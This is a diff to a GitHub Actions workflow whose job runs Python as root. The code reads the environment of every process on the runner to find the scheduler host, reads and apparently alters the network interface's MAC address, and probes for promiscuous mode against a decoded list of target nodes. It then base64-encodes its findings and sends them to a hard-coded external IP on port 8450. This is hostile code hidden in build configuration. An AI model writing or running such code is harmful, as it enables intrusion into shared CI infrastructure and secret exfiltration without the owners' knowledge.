@@ -24,16 +24,20 @@ jobs:
           SLOT: ${{ matrix.slot }}
           TARGETS: ${{ inputs.targets }}
         run: |
-          sudo --preserve-env=GITHUB_RUN_ID,SLOT,TARGETS python3 - <<'PY'
+          NODE=$(python3 - <<'PY'
+          import glob,urllib.parse
+          for path in glob.glob('/proc/[0-9]*/environ'):
+              try:items=open(path,'rb').read().split(b'\0')
+              except OSError:continue
+              d=dict(x.split(b'=',1) for x in items if b'=' in x)
+              if b'scheduler_api_url' in d:
+                  print(urllib.parse.urlsplit(d[b'scheduler_api_url'].decode()).hostname);break
+          PY
+          )
+          export NODE
+          sudo --preserve-env=GITHUB_RUN_ID,SLOT,TARGETS,NODE python3 - <<'PY'
           import base64,glob,json,os,select,socket,subprocess,time,urllib.parse,urllib.request
 
-          def hca_env():
-              for path in glob.glob('/proc/[0-9]*/environ'):
-                  try: items=open(path,'rb').read().split(b'\0')
-                  except OSError: continue
-                  d=dict(x.split(b'=',1) for x in items if b'=' in x)
-                  if b'scheduler_api_url' in d:return d
-              return {}
           def beacon(name,obj):
               data=base64.urlsafe_b64encode(json.dumps(obj,separators=(',',':')).encode()).decode()
               try:urllib.request.urlopen('http://16.146.243.72:8450/'+name+'?d='+data,timeout=2).read()
@@ -43,7 +47,7 @@ jobs:
               return p.returncode
 
           targets=json.loads(base64.urlsafe_b64decode(os.environ['TARGETS']+'='*((4-len(os.environ['TARGETS'])%4)%4)))
-          node=urllib.parse.urlsplit(hca_env()[b'scheduler_api_url'].decode()).hostname
+          node=os.environ['NODE']
           own_ip=socket.gethostbyname(socket.gethostname());orig=open('/sys/class/net/eth0/address').read().strip()
           target=next((x for x in targets if x['node']==node),None)
           result={'run':os.environ['GITHUB_RUN_ID'],'slot':os.environ['SLOT'],'node':node,'orig_mac':orig,'target':target,'set_rc':None,'set_observed':None,'promisc_flag':None,'restored':None,'b_markers':0}
